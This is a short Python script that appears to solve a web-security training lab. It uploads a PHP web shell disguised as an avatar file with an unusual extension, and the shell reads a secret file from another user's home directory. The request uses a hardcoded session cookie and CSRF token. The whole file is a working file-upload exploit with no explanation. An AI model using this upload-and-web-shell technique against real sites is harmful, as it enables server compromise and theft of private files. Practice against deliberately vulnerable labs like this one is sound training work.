import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder

# response = requests.get("https://0a37003503baa74c80c39e2000db0090.web-security-academy.net/my-account?id=wiener")
multipart_data = MultipartEncoder(fields={
    'avatar': ('webshell2.l33t', "<?php echo file_get_contents('/home/carlos/secret'); ?>"),
    'csrf': "WXtCUNjj1gOLSjm5pJAl1ERrnUgHotSR",
    'user': "wiener"
})

headers = {
    "Cookie": "session=XNMQ4623semz7AYyPKhVzswXWsPLLuMo",
    'Content-Type': multipart_data.content_type
}

response = requests.post("https://0a86002a03551bcc8bad2759005b00e7.web-security-academy.net/my-account/avatar", headers=headers, data=multipart_data)

print(response.text, " - ", response.status_code)